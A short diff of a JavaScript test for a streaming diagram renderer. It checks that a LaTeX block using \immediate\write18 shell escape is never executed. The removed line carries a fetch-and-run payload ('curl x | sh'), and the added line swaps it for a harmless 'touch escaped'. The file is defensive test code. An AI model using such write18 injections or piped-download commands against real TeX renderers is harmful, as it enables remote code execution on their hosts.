@@ -183,7 +183,7 @@ describe('diagrams while streaming', () => {
     await init()
     const fake = fakeTex()
     texBook.reset(fake.host, fake.setup)
-    const evil = '```latex\n\\begin{tikzpicture}\\immediate\\write18{curl x | sh}\\end{tikzpicture}\n```'
+    const evil = '```latex\n\\begin{tikzpicture}\\immediate\\write18{touch escaped}\\end{tikzpicture}\n```'
     const { landed, records, waited } = await streamed([`${evil}\n`, 'After.\n'])
     expect(waited).toBe(0)
     expect(fake.runs).toHaveLength(0)
